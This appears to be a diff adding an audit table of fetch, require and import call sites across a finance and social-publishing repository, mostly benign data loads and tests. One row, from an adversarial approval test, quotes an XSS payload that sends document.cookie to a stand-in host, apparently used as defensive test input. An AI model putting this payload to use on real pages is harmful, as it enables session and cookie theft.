+| scripts/universe/build-cik-map.mjs | ` fetch(url, { ` |
+| scripts/universe/build-company-master.mjs | ` require(join(root, "quant", "engines", "company-master.js")) ` |
+| scripts/universe/build-issuer-master.mjs | ` require(join(root, "quant", "engines", "company-master.js")) ` |
+| scripts/universe/build-universe-indexes.mjs | ` require(join(root, "quant", "engines", "company-master.js")) ` |
+| scripts/universe/build-universe-indexes.mjs | ` require(join(root, "core", "identity.js")) ` |
+| scripts/universe/scale-test.mjs | ` require(join(root, "quant", "engines", "company-master.js")) ` |
+| scripts/universe/scale-test.mjs | ` require(join(root, "quant", "engines", "hash.js")).mulberry32(20260912) ` |
+| scripts/universe/verify-company-master.mjs | ` require(join(root, "quant", "engines", "company-master.js")) ` |
+| scripts/vorsorge/adapters/issuers.mjs | ` require(join(root, "vorsorge/engines/etf-holdings.js")) ` |
+| scripts/vorsorge/adapters/issuers.mjs | ` require(join(root, "vorsorge/engines/etf-fundamentals.js")) ` |
+| scripts/vorsorge/build-etf-data.mjs | ` require(join(root, "core/identity.js")) ` |
+| scripts/vorsorge/build-etf-data.mjs | ` require(join(root, "vorsorge/engines/etf-master.js")) ` |
+| scripts/vorsorge/build-etf-data.mjs | ` require(join(root, "vorsorge/engines/etf-taxonomy.js")) ` |
+| scripts/vorsorge/build-etf-data.mjs | ` require(join(root, "vorsorge/engines/etf-fundamentals.js")) ` |
+| scripts/vorsorge/build-etf-data.mjs | ` require(join(root, "vorsorge/engines/etf-changes.js")) ` |
+| scripts/vorsorge/build-etf-data.mjs | ` require(join(root, "vorsorge/engines/etf-analytics.js")) ` |
+| scripts/vorsorge/build-etf-data.mjs | ` require(join(root, "vorsorge/engines/series-codec.js")) ` |
+| scripts/vorsorge/build-etf-data.mjs | ` require(join(root, "vorsorge/engines/monitor.js")) ` |
+| scripts/vorsorge/build-etf-intelligence.mjs | ` require(join(root, "vorsorge/engines/etf-holdings.js")) ` |
+| scripts/vorsorge/build-etf-intelligence.mjs | ` require(join(root, "vorsorge/engines/etf-changes.js")) ` |
+| scripts/vorsorge/fetch-legal-sources.sh | ` fetch() { # id url kind ` |
+| scripts/vorsorge/ingest-esma-firds.mjs | ` require(join(root, "vorsorge/engines/etf-fundamentals.js")) ` |
+| scripts/vorsorge/ingest-esma-firds.mjs | ` fetch(url, { headers: { "User-Agent": UA, Accept: "*/*" }, signal: AbortSignal.timeout(timeout) }) ` |
+| scripts/vorsorge/ingest-esma-funds.mjs | ` fetch(url, { headers: { "User-Agent": UA }, signal: AbortSignal.timeout(90000) }) ` |
+| scripts/vorsorge/ingest-sec-nport.mjs | ` require(join(root, "vorsorge/engines/etf-holdings.js")) ` |
+| scripts/vorsorge/ingest-sec-nport.mjs | ` require(join(root, "vorsorge/engines/etf-fundamentals.js")) ` |
+| scripts/vorsorge/ingest-sec-nport.mjs | ` fetch(url, { method: opts.method &#124;&#124; "GET", headers: { "User-Agent": UA, "Accept-Encoding": "gzip, deflate" }, signal: AbortSignal.timeout(opts.timeout &#124;&#124; 600000) }) ` |
+| scripts/vorsorge/ingest-sec-rr.mjs | ` fetch(url, { headers: { "User-Agent": UA }, signal: AbortSignal.timeout(900000) }) ` |
+| scripts/vorsorge/ingest-tiingo-etfs.mjs | ` require(join(root, "quant/engines/canonical-total-return.js")) ` |
+| scripts/vorsorge/ingest-tiingo-etfs.mjs | ` require(join(root, "vorsorge/engines/series-codec.js")) ` |
+| scripts/vorsorge/ingest-tiingo-etfs.mjs | ` require(join(root, "vorsorge/engines/etf-analytics.js")) ` |
+| scripts/vorsorge/ingest-tiingo-etfs.mjs | ` require(join(root, "vorsorge/engines/etf-master.js")) ` |
+| scripts/vorsorge/ingest-tiingo-etfs.mjs | ` fetch(url, { headers: { Authorization: "Token " + KEY }, signal: ctl.signal }) ` |
+| scripts/vorsorge/ingest-xetra-refdata.mjs | ` require(join(root, "vorsorge/engines/etf-fundamentals.js")) ` |
+| scripts/vorsorge/ingest-xetra-refdata.mjs | ` fetch(url, { headers: { "User-Agent": UA }, signal: AbortSignal.timeout(120000) }) ` |
+| scripts/vorsorge/ingest-xetra-refdata.mjs | ` import(join(root, "scripts/vorsorge/adapters/xlsx.mjs")) ` |
+| scripts/vorsorge/live-smoke.mjs | ` require(process.env.PLAYWRIGHT_PATH &#124;&#124; "playwright") ` |
+| scripts/vorsorge/live-smoke.mjs | ` import(new URL("../access-gate/build.mjs", import.meta.url)) ` |
+| scripts/vorsorge/probe-etf-sources.mjs | ` fetch(url, { method, redirect: "follow", headers: { "User-Agent": ua, "Accept": "*/*", "Accept-Encoding": "gzip, deflate" }, signal: AbortSignal.timeout(45000) }) ` |
+| scripts/vorsorge/probe-eu-etf-sources.mjs | ` fetch(url, { method, redirect: "follow", headers: { "User-Agent": UA, Accept: "*/*" }, signal: AbortSignal.timeout(timeout) }) ` |
+| scripts/vorsorge/probe-eu-etf-sources.mjs | ` import(join(root, "scripts/vorsorge/adapters/xlsx.mjs")) ` |
+| scripts/vorsorge/probe-eu-etf-sources.mjs | ` import(join(root, "scripts/vorsorge/adapters/xlsx.mjs")) ` |
+| scripts/vu2/browser-qa-direct.mjs | ` require(process.env.CODEX_PRIMARY_RUNTIME_NODE_MODULES + '/playwright') ` |
+| scripts/vu2/browser-qa-direct.mjs | ` fetch(base + '/release-id.json') ` |
+| scripts/vu2/browser-qa.mjs | ` require(resolve(root,'quant/engines/factor-evidence.js')) ` |
+| scripts/vu2/browser-qa.mjs | ` require(resolve(root,'core/stock-context.js')) ` |
+| scripts/vu2/browser-qa.mjs | ` fetch() ` |
+| scripts/vu2/measure-acceptance-sample.mjs | ` require(join(ROOT, "quant/api/product-services.js")) ` |
+| scripts/vu2/measure-acceptance-sample.mjs | ` require(join(ROOT, "quant/engines/display-policy.js")) ` |
+| scripts/vu2/measure-acceptance-sample.mjs | ` require(join(ROOT, "quant/engines/query.js")) ` |
+| scripts/vu2/measure-acceptance-sample.mjs | ` require(join(ROOT, "quant/engines/instrument-classification.js")) ` |
+| scripts/vu2/measure-acceptance-sample.mjs | ` require(join(ROOT, "quant/engines/journey-shape.js")) ` |
+| scripts/vu2/measure-consumer-breadth.mjs | ` fetch(base+path) ` |
+| scripts/vu2/measure-consumer-breadth.mjs | ` fetch(base+path) ` |
+| scripts/vu2/measure-intelligence-coherence.mjs | ` require(join(ROOT, "quant/api/product-services.js")) ` |
+| scripts/vu2/measure-intelligence-coherence.mjs | ` require(join(ROOT, "quant/engines/display-policy.js")) ` |
+| scripts/vu2/measure-intelligence-coherence.mjs | ` require(join(ROOT, "quant/engines/query.js")) ` |
+| scripts/vu2/measure-intelligence-coherence.mjs | ` require(join(ROOT, "quant/engines/intelligence-brief.js")) ` |
+| scripts/vu2/measure-intelligence-coherence.mjs | ` require(join(ROOT, "quant/engines/journey-shape.js")) ` |
+| scripts/vu2/measure-intelligence-coherence.mjs | ` require(join(ROOT, "quant/engines/factor-evidence.js")) ` |
+| scripts/vu2/measure-journey.mjs | ` require(join(ROOT, "quant/api/product-services.js")) ` |
+| scripts/vu2/measure-journey.mjs | ` require(join(ROOT, "quant/engines/display-policy.js")) ` |
+| scripts/vu2/measure-journey.mjs | ` require(join(ROOT, "quant/engines/query.js")) ` |
+| scripts/vu2/measure-journey.mjs | ` require(join(ROOT, "quant/engines/journey-shape.js")) ` |
+| scripts/vu2/measure-launch-readiness.mjs | ` require(join(ROOT, "quant/api/product-services.js")) ` |
+| scripts/vu2/measure-launch-readiness.mjs | ` require(join(ROOT, "quant/engines/display-policy.js")) ` |
+| scripts/vu2/measure-launch-readiness.mjs | ` require(join(ROOT, "quant/engines/query.js")) ` |
+| scripts/vu2/measure-launch-readiness.mjs | ` require(join(ROOT, "quant/engines/journey-shape.js")) ` |
+| scripts/vu2/measure-launch-readiness.mjs | ` require(join(ROOT, "quant/engines/intelligence-brief.js")) ` |
+| scripts/vu2/measure-launch-readiness.mjs | ` require(join(ROOT, "quant/engines/company-master.js")) ` |
+| scripts/vu2/measure-launch-readiness.mjs | ` require(join(ROOT, "quant/engines/fundamental-inputs.js")) ` |
+| scripts/vu2/production-smoke.mjs | ` import(new URL('../access-gate/build.mjs',import.meta.url)) ` |
+| scripts/vu2/vercel-should-build.mjs | ` fetch() auf /api/ und keine Vercel-Herkunft. ` |
+| server/product-identity.js | ` fetch(origin + "/" + path.replace(/^\/+/, ""), { headers: { Accept: "application/json" }, redirect: "error" }) ` |
+| social/app.js | ` fetch(BASE + FILES[name], { cache: "no-store" }) ` |
+| social/tests/asset-hashtag-done.test.mjs | ` require(join(ROOT, "social/engines/hashtags.js")) ` |
+| social/tests/asset-hashtag-done.test.mjs | ` require(join(ROOT, "social/engines/approval-projection.js")) ` |
+| social/tests/creative-job-reconcile.test.mjs | ` require(join(ROOT, "social/engines/creative-job.js")) ` |
+| social/tests/creative-job-reconcile.test.mjs | ` require(join(ROOT, "social/engines/hard-invariants.js")) ` |
+| social/tests/editorial-ideation.test.mjs | ` fetch(", "require(", "import(", "publish", "autopublish"]) { ` |
+| social/tests/final-public-text.test.mjs | ` require(join(ROOT, "social/engines/hashtags.js")) ` |
+| social/tests/final-public-text.test.mjs | ` require(join(ROOT, "social/engines/approval-projection.js")) ` |
+| social/tests/final-public-text.test.mjs | ` require(join(ROOT, "social/engines/content-hash.js")) ` |
+| social/tests/orchestrator-adversarial.test.mjs | ` import(${JSON.stringify(join(ROOT, "scripts/social/run-orchestrator.mjs"))}) ` |
+| social/tests/orchestrator.test.mjs | ` import() auf und gibt das Ergebnis als JSON zurueck. */ ` |
+| social/tests/orchestrator.test.mjs | ` import(${JSON.stringify("file://" + modulPfad)}).then((O) => { ` |
+| social/tests/preflight-classifier.test.mjs | ` fetch(request, env, ctx) { ` |
+| social/tests/preflight-classifier.test.mjs | ` fetch(request, env) { ` |
+| social/tests/preflight-classifier.test.mjs | ` fetch(request) { ` |
+| social/tests/preflight-classifier.test.mjs | ` fetch(request, env) { ` |
+| social/tests/preflight-classifier.test.mjs | ` fetch(request, env) { ` |
+| social/tests/preflight-transport.test.mjs | ` fetch(request, env, ctx) { ` |
+| social/tests/readiness-evidence.test.mjs | ` import(MESSER) ` |
+| social/tests/readiness-evidence.test.mjs | ` import(MESSER) ` |
+| status/bausteine/bausteine.js | ` fetch("/quant/data/market/discover-series/ref_" + t + ".json").then(function (r) { return r.ok ? r.json() : null ` |
+| status/status.js | ` fetch(path, { cache: "no-store", credentials: "same-origin" }) ` |
+| studio/stories/build-story.mjs | ` require(join(execFileSync('npm', ['root', '-g']).toString().trim(), 'playwright')) ` |
+| studio/stories/kit/render.mjs | ` require(join(execFileSync('npm', ['root', '-g']).toString().trim(), 'playwright')) ` |
+| supertrader/assets/sf-research.js | ` fetch(DATA + rel, { cache: 'no-cache' }).then(function (r) { if (!r.ok) throw new Error('HTTP ' + r.status) ` |
+| supertrader/assets/st-chart.js | ` fetch(path, { cache: 'no-cache' }).then(function (r) { ` |
+| supertrader/assets/st-chart.js | ` fetch(path, { cache: 'no-cache' }).then(function (r) { if (!r.ok) throw new Error('HTTP ' + r.status) ` |
+| supertrader/assets/st-redesign.js | ` fetch('/quant/data/market/discover-series/' + encodeURIComponent(id) + '.json', { cache: 'no-cache' }).then(function (r) { if (!r.ok) throw new Error('HTTP ' + r.stat ` |
+| supertrader/assets/st-technical.js | ` fetch(url, { cache: 'no-cache' }).then(function (r) { if (!r.ok) throw new Error(url + ' HTTP ' + r.status) ` |
+| supertrader/assets/supertrader.js | ` fetch(DATA + name, { cache: 'no-cache' }).then(function (r) { if (!r.ok) throw new Error(name + ' HTTP ' + r.status) ` |
+| supertrader/assets/supertrader.js | ` fetch(e.path, { cache: 'no-cache' }).then(function (r) { if (!r.ok) throw 0 ` |
+| sw.js | ` fetch(req).catch(function () { ` |
+| technical/app.js | ` fetch(path, { credentials: "same-origin" }).then(function (r) { if (!r.ok) throw new Error("HTTP " + r.status) ` |
+| technical/app.js | ` fetch(path, { credentials: "same-origin" }).then(function (r) { ` |
+| technical/engine/stock-summary.js | ` require(path) : name() ` |
+| technical/tests/technical-assistant.test.mjs | ` require(join(root, "quant/engines/technical/technical-query.js")) ` |
+| technical/tests/technical-assistant.test.mjs | ` require(join(root, "technical/engine/templates.js")) ` |
+| technical/tests/technical-assistant.test.mjs | ` require(join(root, "technical/engine/assistant.js")) ` |
+| technical/tests/technical-assistant.test.mjs | ` require(join(root, "technical/engine/model.js")) ` |
+| technical/tests/technical-choppiness-range.test.mjs | ` require(join(root, "quant/engines/technical/indicators.js")) ` |
+| technical/tests/technical-choppiness-range.test.mjs | ` require(join(root, "quant/engines/technical/screener-contract.js")) ` |
+| technical/tests/technical-data-contract.test.mjs | ` require(join(root, "quant/engines/technical/screener-contract.js")) ` |
+| technical/tests/technical-data-contract.test.mjs | ` require(join(root, "quant/engines/technical/technical-query.js")) ` |
+| technical/tests/technical-data-contract.test.mjs | ` require(join(root, "core/identity.js")) ` |
+| technical/tests/technical-data-contract.test.mjs | ` import(join(root, "scripts/technical/contract-doc.mjs")) ` |
+| technical/tests/technical-e2e-consistency.test.mjs | ` require(join(root, "quant/engines/technical/indicators.js")) ` |
+| technical/tests/technical-e2e-consistency.test.mjs | ` require(join(root, "quant/engines/technical/canonical-bars.js")) ` |
+| technical/tests/technical-e2e-consistency.test.mjs | ` require(join(root, "quant/engines/technical/ti/context.js")) ` |
+| technical/tests/technical-e2e-consistency.test.mjs | ` require(join(root, "quant/engines/technical/formations.js")) ` |
+| technical/tests/technical-e2e-consistency.test.mjs | ` require(join(root, "quant/engines/technical/technical-query.js")) ` |
+| technical/tests/technical-e2e-consistency.test.mjs | ` require(join(root, "core/listing-staleness.js")) ` |
+| technical/tests/technical-e2e-consistency.test.mjs | ` require(join(root, "quant/engines/technical/candlesticks.js")) ` |
+| technical/tests/technical-e2e-consistency.test.mjs | ` require(join(root, "technical/engine/model.js")) ` |
+| technical/tests/technical-e2e-consistency.test.mjs | ` require(join(root, "technical/engine/model.js")) ` |
+| technical/tests/technical-e2e-consistency.test.mjs | ` require(join(root, "technical/engine/model.js")) ` |
+| technical/tests/technical-e2e-consistency.test.mjs | ` require(join(root, "technical/engine/model.js")) ` |
+| technical/tests/technical-stock-summary.test.mjs | ` require(join(root, "technical/engine/stock-summary.js")) ` |
+| technical/tests/technical-stock-summary.test.mjs | ` require(join(root, "technical/engine/templates.js")) ` |
+| technical/tests/technical-stock-summary.test.mjs | ` require(join(root, "technical/engine/assistant.js")) ` |
+| technical/tests/technical-stock-summary.test.mjs | ` require(join(root, "quant/engines/technical/technical-query.js")) ` |
+| technical/tests/technical-stock-summary.test.mjs | ` require(join(root, "quant/engines/technical/price-jumps.js")) ` |
+| technical/tests/technical-stock-summary.test.mjs | ` require(join(root, "core/identity.js")) ` |
+| technical/tests/technical-stock-summary.test.mjs | ` import(join(root, "scripts/technical/world/build-screener.mjs")) ` |
+| technical/tests/technical-templates-dq-order.test.mjs | ` require(join(root, "quant/engines/technical/technical-query.js")) ` |
+| technical/tests/technical-templates-dq-order.test.mjs | ` require(join(root, "technical/engine/templates.js")) ` |
+| technical/tests/technical-templates-dq-order.test.mjs | ` require(join(root, "technical/engine/assistant.js")) ` |
+| technical/tests/technical-templates.test.mjs | ` require(join(root, "quant/engines/technical/technical-query.js")) ` |
+| technical/tests/technical-templates.test.mjs | ` require(join(root, "technical/engine/templates.js")) ` |
+| technical/tests/technical-templates.test.mjs | ` require(join(root, "technical/engine/model.js")) ` |
+| technical/tests/technical-world-context.test.mjs | ` require(join(root, "technical/engine/world-context.js")) ` |
+| technical/tests/technical-world-context.test.mjs | ` require(join(root, "quant/engines/factor-evidence.js")) ` |
+| technical/tests/technical-world-context.test.mjs | ` require(join(root, "technical/engine/model.js")) ` |
+| technical/tests/technical-world-context.test.mjs | ` require(join(root, "core/identity.js")) ` |
+| technical/tests/technical-world.test.mjs | ` require(join(root, "technical/engine/model.js")) ` |
+| technical/tests/technical-world.test.mjs | ` require(join(root, "quant/engines/technical/technical-query.js")) ` |
+| technical/tests/technical-world.test.mjs | ` import(join(root, "scripts/vu2/release-id.mjs")) ` |
+| technical/tests/technical-world.test.mjs | ` require(join(root, "quant/engines/technical/query-text.js")) ` |
+| technical/tests/technical-world.test.mjs | ` require(join(root, "core/listing-staleness.js")) ` |
+| technical/tests/technical-world.test.mjs | ` import(join(root, "scripts/technical/world/signal-evidence.mjs")) ` |
+| vorsorge/app.js | ` fetch(url, { cache: "no-cache" }).then(function (r) { if (!r.ok) throw new Error(r.status + " " + url) ` |
+| willkommen/app.js | ` fetch(url, { cache: 'no-cache' }).then(function (r) { if (!r.ok) throw new Error('HTTP ' + r.status) ` |
+| willkommen/app.js | ` fetch(path, { cache: 'default', credentials: 'omit' }).then(function (r) { if (!r.ok) throw new Error('HTTP_' + r.status) ` |
+| willkommen/start/start.js | ` fetch(path, { cache: 'default', credentials: 'omit' }).then(function (r) { if (!r.ok) throw new Error('HTTP_' + r.status) ` |
+| worker-waker/src/index.mjs | ` fetch(url, { headers: kopf }) ` |
+| worker-waker/src/index.mjs | ` fetch(     "https://api.github.com/repos/" + env.GITHUB_REPO + ` |
+| worker-waker/src/index.mjs | ` fetch(request, env) { ` |
+| worker-waker/tests/waker.test.mjs | ` import(join(root, "worker-waker", "src", "index.mjs")) ` |
+| worker-waker/tests/waker.test.mjs | ` import(join(root, "worker-waker", "src", "github-app.mjs")) ` |
+| worker-waker/tests/waker.test.mjs | ` import(join(root, "worker-waker", "src", "index.mjs")) ` |
+| worker-waker/tests/waker.test.mjs | ` fetch(     new Request("https://x/status"), umgebung()) ` |
+| worker-waker/tests/waker.test.mjs | ` fetch(     new Request("https://x/status"), { GITHUB_REPO: REPO, GITHUB_APP_ID: APP_ID }) ` |
+| worker-waker/tests/waker.test.mjs | ` import(join(root, "worker-waker", "src", "index.mjs")) ` |
+| worker/src/index.mjs | ` fetch(request, env, ctx) { ` |
+| worker/src/index.mjs | ` fetch(new Request("https://vu-live/health")) ` |
+| worker/src/index.mjs | ` fetch(request) ` |
+| worker/src/tiingo-link.mjs | ` fetch() mit einem Upgrade-Kopf, und das Ergebnis traegt die Methoden ` |
+| worker/src/vu-live.mjs | ` fetch(request) { ` |
+| worker/tests/vu-live.test.mjs | ` fetch(anfrage("https://vu-live/live", { Upgrade: "websocket" })) ` |
+| worker/tests/vu-live.test.mjs | ` fetch(anfrage("https://vu-live/live", { Upgrade: "websocket" })) ` |
+| worker/tests/vu-live.test.mjs | ` fetch(     anfrage("https://live.visionuniverse.de/live", ` |
+| worker/tests/vu-live.test.mjs | ` fetch(     anfrage("https://live.visionuniverse.de/live", ` |
+| worker/tests/vu-live.test.mjs | ` fetch(     anfrage("https://live.visionuniverse.de/live", { Upgrade: "websocket" }), env) ` |
+| worker/tests/vu-live.test.mjs | ` fetch(     anfrage("https://live.visionuniverse.de/live", { Origin: "https://research.visionuniverse.de" }), ` |
+| worker/tests/vu-live.test.mjs | ` fetch(     anfrage("https://live.visionuniverse.de/health", { Origin: "https://research.visionuniverse.de" }), ` |
+| worker/tests/vu-live.test.mjs | ` fetch(anfrage("https://live.visionuniverse.de/"), env) ` |
+| worker/tests/vu-live.test.mjs | ` fetch(anfrage("https://live.visionuniverse.de/kurse"), env) ` |
+| workers/vision-universe-social/src/approval.js | ` fetch(       "https://api.github.com/repos/" + repo + "/actions/workflows/" + ` |
+| workers/vision-universe-social/src/index.js | ` fetch(request, env, ctx) { ` |
+| workers/vision-universe-social/tests/approval-adversarial.test.mjs | ` fetch(request("/social/approval/queue" + KEY, { ` |
+| workers/vision-universe-social/tests/approval-adversarial.test.mjs | ` fetch(request("/approval/session", { ` |
+| workers/vision-universe-social/tests/approval-adversarial.test.mjs | ` fetch(request(pfad, { ` |
+| workers/vision-universe-social/tests/approval-adversarial.test.mjs | ` fetch(request(pfad, { method: methode }), env) ` |
+| workers/vision-universe-social/tests/approval-adversarial.test.mjs | ` fetch(request(pfad, { headers: { cookie: alt } }), env) ` |
+| workers/vision-universe-social/tests/approval-adversarial.test.mjs | ` fetch(request("/approval", { headers: { cookie: c } }), env) ` |
+| workers/vision-universe-social/tests/approval-adversarial.test.mjs | ` fetch(request("/social/approval/queue" + KEY, { method: "POST", ` |
+| workers/vision-universe-social/tests/approval-adversarial.test.mjs | ` fetch(request("/approval", { headers: { cookie } }), env) ` |
+| workers/vision-universe-social/tests/approval-adversarial.test.mjs | ` fetch(request("/approval/" + ID, { headers: { cookie } }), env) ` |
+| workers/vision-universe-social/tests/approval-adversarial.test.mjs | ` fetch(request("/approval"), env), ` |
+| workers/vision-universe-social/tests/approval-adversarial.test.mjs | ` fetch(request("/approval", { headers: { cookie } }), env), ` |
+| workers/vision-universe-social/tests/approval-adversarial.test.mjs | ` fetch(request("/approval/" + ID, { headers: { cookie } }), env), ` |
+| workers/vision-universe-social/tests/approval-adversarial.test.mjs | ` fetch(request("/approval/session", { method: "POST", ` |
+| workers/vision-universe-social/tests/approval-adversarial.test.mjs | ` fetch("//x.invalid?c="+document.cookie)</script>' + ` |
+| workers/vision-universe-social/tests/approval-adversarial.test.mjs | ` fetch(request("/approval/" + ID, { headers: { cookie } }), env), ` |
+| workers/vision-universe-social/tests/approval-adversarial.test.mjs | ` fetch(request("/social/approval/queue" + KEY, { ` |
+| workers/vision-universe-social/tests/approval-adversarial.test.mjs | ` fetch(request(pfad + "?fingerprint=" + hash, ` |
+| workers/vision-universe-social/tests/approval-adversarial.test.mjs | ` fetch(request( ` |
+| workers/vision-universe-social/tests/approval-adversarial.test.mjs | ` fetch(request("/approval/session", { method: "POST", ` |
+| workers/vision-universe-social/tests/approval-adversarial.test.mjs | ` fetch(request("/social/approval/queue" + KEY, { ` |
+| workers/vision-universe-social/tests/approval-adversarial.test.mjs | ` fetch(request("/social/approval/queue" + KEY, { ` |
+| workers/vision-universe-social/tests/approval-adversarial.test.mjs | ` fetch(request("/social/approval/queue" + KEY, { ` |
+| workers/vision-universe-social/tests/approval-adversarial.test.mjs | ` fetch(request("/approval/session", { method: "POST", ` |
+| workers/vision-universe-social/tests/approval-adversarial.test.mjs | ` fetch(request("/approval", ` |
+| workers/vision-universe-social/tests/approval-asset-gate.test.mjs | ` fetch(request("/social/approval/queue" + KEY, { ` |
+| workers/vision-universe-social/tests/approval-asset-gate.test.mjs | ` fetch(request("/approval/session", { ` |
+| workers/vision-universe-social/tests/approval-asset-gate.test.mjs | ` fetch(request("/approval/" + ID, { headers: { cookie } }), env) ` |
+| workers/vision-universe-social/tests/approval-asset-gate.test.mjs | ` fetch(request(pfad, { ` |
+| workers/vision-universe-social/tests/approval-asset-gate.test.mjs | ` fetch(request("/approval/" + ID, { headers: { cookie } }), env) ` |
+| workers/vision-universe-social/tests/approval-asset-gate.test.mjs | ` fetch(request("/approval/" + ID, { headers: { cookie } }), env) ` |
+| workers/vision-universe-social/tests/approval-card.test.mjs | ` fetch(request("/social/approval/queue" + KEY, { ` |
+| workers/vision-universe-social/tests/approval-card.test.mjs | ` fetch(request("/approval/session", { ` |
+| workers/vision-universe-social/tests/approval-card.test.mjs | ` fetch(request("/approval/" + id, { headers: { cookie } }), env) ` |
+| workers/vision-universe-social/tests/approval-card.test.mjs | ` fetch(request("/approval/" + ID), env) ` |
+| workers/vision-universe-social/tests/approval-card.test.mjs | ` fetch(     request("/approval/" + encodeURIComponent(e.candidateId), { headers: { cookie } }), env) ` |
+| workers/vision-universe-social/tests/approval-card.test.mjs | ` fetch(request("/approval/" + ID, { headers: { cookie } }), env) ` |
+| workers/vision-universe-social/tests/approval-content-status.test.mjs | ` fetch(request("/social/approval/queue", { ` |
+| workers/vision-universe-social/tests/approval-content-status.test.mjs | ` fetch(request("/social/approval/queue", { ` |
+| workers/vision-universe-social/tests/approval-content-status.test.mjs | ` fetch(request("/social/approval/queue", { ` |
+| workers/vision-universe-social/tests/approval-content-status.test.mjs | ` fetch(request("/social/approval/queue", { ` |
+| workers/vision-universe-social/tests/approval-content-status.test.mjs | ` fetch(request("/approval/session", { ` |
+| workers/vision-universe-social/tests/approval-content-status.test.mjs | ` fetch(request("/approval", { headers: { cookie } }), env) ` |
+| workers/vision-universe-social/tests/approval-decision.test.mjs | ` fetch(request("/social/approval/queue" + KEY, { ` |
+| workers/vision-universe-social/tests/approval-decision.test.mjs | ` fetch(request("/approval/session", { ` |
+| workers/vision-universe-social/tests/approval-decision.test.mjs | ` fetch(request(pfad, { ` |
+| workers/vision-universe-social/tests/approval-decision.test.mjs | ` fetch(request("/approval/" + ID, { headers: { cookie } }), env) ` |
+| workers/vision-universe-social/tests/approval-decision.test.mjs | ` fetch(request("/approval", { headers: { cookie } }), env)).text() ` |
+| workers/vision-universe-social/tests/approval-decision.test.mjs | ` fetch(request("/social/approval/queue" + KEY, { method: "POST", ` |
+| workers/vision-universe-social/tests/approval-decision.test.mjs | ` fetch(request(pfad, { method: "POST", ` |
+| workers/vision-universe-social/tests/approval-decision.test.mjs | `` fetch(request(`/approval/${ID}/publish` + KEY, { `` |
+| workers/vision-universe-social/tests/approval-decision.test.mjs | ` fetch(request(pfad, { headers: { cookie } }), env) ` |
+| workers/vision-universe-social/tests/approval-decision.test.mjs | ` fetch(request("/social/meta/publish", { method: "POST", ` |
+| workers/vision-universe-social/tests/approval-decision.test.mjs | ` fetch(request("/social/meta/publish" + KEY, { method: "POST", ` |
+| workers/vision-universe-social/tests/approval-decision.test.mjs | ` fetch(request("/social/meta/publish" + KEY, { method: "POST", ` |
+| workers/vision-universe-social/tests/approval-decision.test.mjs | ` fetch(request("/approval", { headers: { cookie } }), env) ` |
+| workers/vision-universe-social/tests/approval-manual-run.test.mjs | ` fetch(request("/approval/session", { ` |
+| workers/vision-universe-social/tests/approval-manual-run.test.mjs | ` fetch(request("/approval/run", { ` |
+| workers/vision-universe-social/tests/approval-manual-run.test.mjs | ` fetch(request("/approval"), env) ` |
+| workers/vision-universe-social/tests/approval-manual-run.test.mjs | ` fetch(request("/approval/run", { ` |
+| workers/vision-universe-social/tests/approval-queue.test.mjs | ` fetch(request("/social/approval/queue" + KEY, { ` |
+| workers/vision-universe-social/tests/approval-queue.test.mjs | ` fetch(request("/approval/session", { ` |
+| workers/vision-universe-social/tests/approval-queue.test.mjs | ` fetch(request("/social/approval/queue", { ` |
+| workers/vision-universe-social/tests/approval-queue.test.mjs | ` fetch(request("/social/approval/queue", { ` |
+| workers/vision-universe-social/tests/approval-queue.test.mjs | ` fetch(request("/social/approval/queue" + KEY), env) ` |
+| workers/vision-universe-social/tests/approval-queue.test.mjs | ` fetch(request("/approval", { headers: { cookie } }), env) ` |
+| workers/vision-universe-social/tests/approval-queue.test.mjs | ` fetch(request("/approval", { headers: { cookie } }), env)).text() ` |
+| workers/vision-universe-social/tests/approval-queue.test.mjs | ` fetch(request("/approval", { headers: { cookie } }), env)).text() ` |
+| workers/vision-universe-social/tests/approval-queue.test.mjs | ` fetch(request("/approval", { headers: { cookie } }), env)).text() ` |
+| workers/vision-universe-social/tests/approval-queue.test.mjs | ` fetch(request("/approval", { headers: { cookie } }), env)).text() ` |
+| workers/vision-universe-social/tests/approval-queue.test.mjs | ` fetch(request(pfad), env) ` |
+| workers/vision-universe-social/tests/approval-queue.test.mjs | ` fetch(request("/approval"), env)).text() ` |
+| workers/vision-universe-social/tests/approval-queue.test.mjs | ` fetch(request("/approval", { headers: { cookie } }), env)).text() ` |
+| workers/vision-universe-social/tests/approval-session.test.mjs | ` fetch(request("/approval/session", { ` |
+| workers/vision-universe-social/tests/approval-session.test.mjs | ` fetch(request("/approval"), env) ` |
+| workers/vision-universe-social/tests/approval-session.test.mjs | ` fetch(request("/approval"), env) ` |
+| workers/vision-universe-social/tests/approval-session.test.mjs | ` fetch(     request("/approval?key=" + encodeURIComponent(TEST_ADMIN_KEY)), env) ` |
+| workers/vision-universe-social/tests/approval-session.test.mjs | ` fetch(request( ` |
+| workers/vision-universe-social/tests/approval-session.test.mjs | ` fetch(request("/approval", { headers: { cookie } }), env) ` |
+| workers/vision-universe-social/tests/approval-session.test.mjs | ` fetch(request("/approval", { headers: { cookie } }), env) ` |
+| workers/vision-universe-social/tests/approval-session.test.mjs | ` fetch(request("/approval", { headers: { cookie } }), env) ` |
+| workers/vision-universe-social/tests/approval-session.test.mjs | ` fetch(request("/approval", { headers: { cookie } }), gedreht) ` |
+| workers/vision-universe-social/tests/approval-session.test.mjs | ` fetch(request("/approval", { headers: { cookie: probe } }), env) ` |
+| workers/vision-universe-social/tests/approval-session.test.mjs | ` fetch(request("/approval", { headers: { cookie } }), env) ` |
+| workers/vision-universe-social/tests/approval-session.test.mjs | ` fetch(request("/approval"), ohne) ` |
+| workers/vision-universe-social/tests/approval-session.test.mjs | ` fetch(request("/approval/session", { ` |
+| workers/vision-universe-social/tests/approval-session.test.mjs | ` fetch(request("/approval/session", { ` |
+| workers/vision-universe-social/tests/approval-session.test.mjs | ` fetch(request(pfad), env) ` |
+| workers/vision-universe-social/tests/approval-session.test.mjs | ` fetch(     request("/approval/queue", { headers: { cookie } }), env) ` |
+| workers/vision-universe-social/tests/approval-session.test.mjs | ` fetch(request(pfad, { headers: { cookie } }), env) ` |
+| workers/vision-universe-social/tests/approval-session.test.mjs | ` fetch(       request(pfad, { method: "POST", headers: { cookie } }), env) ` |
+| workers/vision-universe-social/tests/approval-session.test.mjs | ` fetch(     request("/approval/logout", { method: "POST", headers: { cookie } }), env) ` |
+| workers/vision-universe-social/tests/approval-session.test.mjs | ` fetch(request("/approval", { headers: { cookie } }), env) ` |
+| workers/vision-universe-social/tests/approval-session.test.mjs | ` fetch(request("/approval/session"), env) ` |
+| workers/vision-universe-social/tests/approval-session.test.mjs | ` fetch(request("/health"), env) ` |
